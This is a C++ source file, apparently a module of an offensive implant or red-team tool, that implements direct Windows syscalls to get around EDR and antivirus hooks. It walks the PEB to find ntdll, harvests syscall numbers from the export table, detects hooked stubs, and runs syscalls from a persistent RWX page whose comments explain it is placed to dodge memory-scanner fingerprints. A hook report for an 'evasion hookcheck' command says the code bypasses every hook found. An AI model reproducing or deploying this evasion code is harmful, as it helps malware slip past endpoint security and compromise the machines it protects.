#include "DirectSyscall.h"

// ── Internal SSN table ────────────────────────────────────────────────────────

struct SsnEntry { DWORD hash; int ssn; bool hooked; };
static SsnEntry g_table[512];
static int      g_count = 0;

// Persistent RWX stub page — allocated ONCE in Init(), reused in every Exec() call.
// Eliminates the per-call VirtualAlloc/VirtualFree pattern that memory scanners flag as
// an unbacked RWX region fingerprint.
static void* g_stubPage = nullptr;

// ── Utility: get ntdll base via PEB walk (no imports needed) ─────────────────
// PEB.Ldr.InMemoryOrderModuleList[1] = ntdll on all Windows versions.

static PVOID GetNtdllBase() {
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    auto* ldr = peb->Ldr;
    auto* le  = ldr->InMemoryOrderModuleList.Flink;
    auto* e   = CONTAINING_RECORD(le, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    le = e->InMemoryOrderLinks.Flink; // [1] = ntdll
    e  = CONTAINING_RECORD(le, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return e->DllBase;
}

// ── Walk EAT and fill the SSN table ──────────────────────────────────────────

int DirectSyscall::Init() {
    g_count = 0;

    // Allocate the persistent stub page once — 4096 bytes (one page) is enough.
    // Allocated here so the single RWX region appears during startup alongside all
    // other early-init allocations, rather than repeatedly appearing mid-session.
    if (!g_stubPage) {
        g_stubPage = VirtualAlloc(NULL, 4096,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    }

    BYTE* base = (BYTE*)GetNtdllBase();
    if (!base) return 0;

    auto* dos  = (PIMAGE_DOS_HEADER)base;
    auto* nt   = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    auto* data = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!data->VirtualAddress) return 0;

    auto* exp   = (PIMAGE_EXPORT_DIRECTORY)(base + data->VirtualAddress);
    auto* names = (DWORD*)(base + exp->AddressOfNames);
    auto* funcs = (DWORD*)(base + exp->AddressOfFunctions);
    auto* ords  = (WORD*) (base + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames && g_count < 512; i++) {
        const char* name = (const char*)(base + names[i]);
        // Only Nt* functions have syscall stubs
        if (name[0] != 'N' || name[1] != 't') continue;

        BYTE* fn = base + funcs[ords[i]];

        // x64 clean stub: 4C 8B D1 | B8 xx xx 00 00 | 0F 05 | C3
        // Bytes 0-2: mov r10,rcx
        // Bytes 3-7: mov eax, <SSN>   ← we read SSN from bytes 4-5
        bool hooked = false;
        int  ssn    = -1;

        if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8) {
            // Clean stub — SSN in bytes 4..5 (usually < 512)
            ssn = (int)(*(WORD*)(fn + 4));
        } else {
            // First bytes replaced with JMP or MOV R11 — hooked
            hooked = true;
            // Try to find the real stub nearby (some EDRs trampoline forward)
            for (int off = 1; off < 32; off++) {
                if (fn[off+0]==0x4C && fn[off+1]==0x8B && fn[off+2]==0xD1 && fn[off+3]==0xB8) {
                    ssn = (int)(*(WORD*)(fn + off + 4));
                    break;
                }
            }
        }

        if (ssn < 0) continue;

        DWORD h = Hash(name);
        g_table[g_count++] = { h, ssn, hooked };
    }

    return g_count;
}

// ── Lookup ────────────────────────────────────────────────────────────────────

int DirectSyscall::GetSSN(DWORD nameHash) {
    for (int i = 0; i < g_count; i++)
        if (g_table[i].hash == nameHash) return g_table[i].ssn;
    return -1;
}

bool DirectSyscall::IsHooked(DWORD nameHash) {
    for (int i = 0; i < g_count; i++)
        if (g_table[i].hash == nameHash) return g_table[i].hooked;
    return false;
}

// ── Syscall trampoline stub ───────────────────────────────────────────────────
// Dynamically builds this x64 sequence in RWX memory:
//   4C 8B D1              mov r10, rcx
//   B8 xx xx 00 00        mov eax, <SSN>
//   0F 05                 syscall
//   C3                    ret
// Then calls it as a variadic function pointer with the supplied arguments.
// The caller's args land in rcx/rdx/r8/r9 (first 4) and stack (args 5-8)
// exactly as the Windows x64 ABI requires for Nt* syscalls.

typedef NTSTATUS(*SyscallFn)(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,
                              ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);

NTSTATUS DirectSyscall::Exec(int ssn,
    ULONG_PTR a1, ULONG_PTR a2, ULONG_PTR a3, ULONG_PTR a4,
    ULONG_PTR a5, ULONG_PTR a6, ULONG_PTR a7, ULONG_PTR a8)
{
    if (ssn < 0) return STATUS_INVALID_PARAMETER;

    BYTE stub[11] = {
        0x4C, 0x8B, 0xD1,              // mov r10, rcx
        0xB8, (BYTE)(ssn & 0xFF),      // mov eax, ssn (low byte)
              (BYTE)((ssn>>8) & 0xFF), //              (high byte)
              0x00, 0x00,              //              (zeroes)
        0x0F, 0x05,                    // syscall
        0xC3                           // ret
    };

    // Reuse the persistent stub page — write new SSN bytes in place, then call.
    // No alloc/free per call: eliminates the repeated unbacked-RWX pattern.
    void* mem = g_stubPage;
    if (!mem) return STATUS_NO_MEMORY;
    memcpy(mem, stub, sizeof(stub));
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stub));

    auto fn = (SyscallFn)mem;
    return fn(a1, a2, a3, a4, a5, a6, a7, a8);
}

// ── Hook report (for `evasion hookcheck` command) ────────────────────────────

std::string DirectSyscall::HookReport() {
    std::string r = "DirectSyscall Hook Report (" + std::to_string(g_count) + " Nt* functions)\n";
    r += "----------------------------------------------\n";
    int hookedCount = 0;
    BYTE* base = (BYTE*)GetNtdllBase();
    auto* dos  = (PIMAGE_DOS_HEADER)base;
    auto* nt   = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    auto* exp  = (PIMAGE_EXPORT_DIRECTORY)(base +
                   nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    auto* names= (DWORD*)(base + exp->AddressOfNames);
    auto* funcs= (DWORD*)(base + exp->AddressOfFunctions);
    auto* ords = (WORD*)(base  + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)(base + names[i]);
        if (name[0] != 'N' || name[1] != 't') continue;
        DWORD h = Hash(name);
        for (int j = 0; j < g_count; j++) {
            if (g_table[j].hash == h) {
                if (g_table[j].hooked) {
                    r += "[HOOKED] " + std::string(name) +
                         " SSN=" + std::to_string(g_table[j].ssn) + "\n";
                    hookedCount++;
                }
                break;
            }
        }
    }
    if (hookedCount == 0)
        r += "No hooks detected — ntdll appears clean.\n";
    else
        r += "\n" + std::to_string(hookedCount) + " hooked function(s) found.\n"
             "Each hook = EDR/AV has modified this Nt* stub.\n"
             "DirectSyscall::Exec() bypasses all of them.\n";
    return r;
}
